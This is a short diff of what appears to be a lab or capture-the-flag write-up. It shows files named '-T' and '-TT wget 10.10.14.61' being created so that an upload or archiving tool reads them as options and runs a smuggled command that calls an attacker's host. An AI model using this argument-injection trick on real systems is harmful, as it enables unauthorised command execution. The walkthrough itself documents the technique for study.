@@ -151,14 +151,14 @@ As seen here its executing the -h2 flag
 ```python
 ❯❯❯ touch -- "-T"
 
-❯❯❯ touch -- "-TT id"
+❯❯❯ touch -- "-TT wget 10.10.14.61"
 
 ❯❯❯ echo 'test' > test.txt
 ```
 
 Ill create the files
 
-![](Pasted%20image%2020261016190444.png)
+![](Pasted%20image%2020261016190855.png)
 
 Ill start by uploading `-T` then ending on `test.txt`
 
